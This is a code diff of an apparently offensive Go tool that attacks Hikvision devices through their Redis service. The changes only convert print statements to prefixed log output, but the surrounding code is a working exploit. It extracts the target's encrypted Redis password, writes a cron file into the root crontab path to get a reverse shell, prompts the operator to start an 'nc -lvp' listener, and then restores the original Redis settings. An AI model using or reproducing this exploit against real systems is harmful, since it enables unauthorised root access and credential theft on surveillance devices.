@@ -63,12 +63,15 @@ func (h *Hik) check() {
 func (h *Hik) exploit() {
 	h.checkRedis()
 	if h.redisOriginalDir == "" {
+		log.SetPrefix("[-] ")
 		log.Fatalln("Can Not Connect To Target's Redis.")
 	}
-	fmt.Printf("Reserve Server %s Ready?????[nc -lvp %s]:", h.IP, h.Port)
+	log.SetPrefix("[!] ")
+	log.Printf("Reserve Server %s Ready?????[nc -lvp %s]:", h.IP, h.Port)
 	fmt.Scanln()
 	h.reserveShell()
-	fmt.Println("Exploit Finish,If Failed Please Try Again.")
+	log.SetPrefix("[+] ")
+	log.Println("Exploit Finish,If Failed Please Try Again.")
 }
 func (h *Hik) checkRedis() {
 	rdb := redis.NewClient(&redis.Options{
@@ -82,8 +85,9 @@ func (h *Hik) checkRedis() {
 	}
 	redisDbFilename, _ := rdb.ConfigGet("dbfilename").Result()
 	redisDir, _ := rdb.ConfigGet("dir").Result()
-	fmt.Println("redis dir: " + redisDir[1].(string))
-	fmt.Println("redis dbfilename: " + redisDbFilename[1].(string))
+	log.SetPrefix("[!] ")
+	log.Println("redis dir: " + redisDir[1].(string))
+	log.Println("redis dbfilename: " + redisDbFilename[1].(string))
 	h.redisOriginalDbFilename = redisDbFilename[1].(string)
 	h.redisOriginalDir = redisDir[1].(string)
 	if strings.Contains(h.redisOriginalDir, "linux") {
@@ -101,7 +105,8 @@ func (h *Hik) reserveShell() {
 	rdb.ConfigSet("dir", cronPath[1])
 	rdb.ConfigSet("dbfilename", "root")
 	rdb.Save()
-	fmt.Println("Waiting For Reverse.......")
+	log.SetPrefix("[!] ")
+	log.Println("Waiting For Reverse.......")
 	time.Sleep(5 * time.Second)
 	rdb.ConfigSet("dir", h.redisOriginalDir)
 	rdb.ConfigSet("dbfilename", h.redisOriginalDbFilename)
@@ -135,22 +140,26 @@ func (h *Hik) Run() {
 	h.check()
 	if h.isVuln {
 		if h.canGetShell {
-			fmt.Printf("Target %s Is Vuln And Can GetShell With Redis.\n", h.Target)
+			log.Printf("Target %s Is Vuln And Can GetShell With Redis.\n", h.Target)
 			if h.Exploit {
-				fmt.Printf("Targets %s Redis Encrypt Password is %s\n", h.Target, h.redisPasswordEncrypted)
-				fmt.Printf("Please Use HikDecrypt Tools(https://github.com/wafinfo/Hikvision) On Windows To Decrypt It\n")
-				fmt.Printf("Input Decrypted Password To Exploit:")
+				log.SetPrefix("[!] ")
+				log.Printf("Targets %s Redis Encrypt Password is %s\n", h.Target, h.redisPasswordEncrypted)
+				log.Printf("Please Use HikDecrypt Tools(https://github.com/wafinfo/Hikvision) On Windows To Decrypt It\n")
+				log.Printf("Input Decrypted Password To Exploit:")
 				fmt.Scanf("%s\n", &h.redisPasswordDecrypted)
 				if h.redisPasswordDecrypted == "" {
+					log.SetPrefix("[-] ")
 					log.Fatalln("Input Password Invalid.")
 				}
 				h.exploit()
 			}
 		} else {
-			fmt.Printf("Target %s Is Vuln But Can Not GetShell With Redis.\n", h.Target)
+			log.SetPrefix("[-] ")
+			log.Printf("Target %s Is Vuln But Can Not GetShell With Redis.\n", h.Target)
 		}
 
 	} else {
-		fmt.Printf("Target %s Is Safe.\n", h.Target)
+		log.SetPrefix("[-] ")
+		log.Printf("Target %s Is Safe.\n", h.Target)
 	}
 }
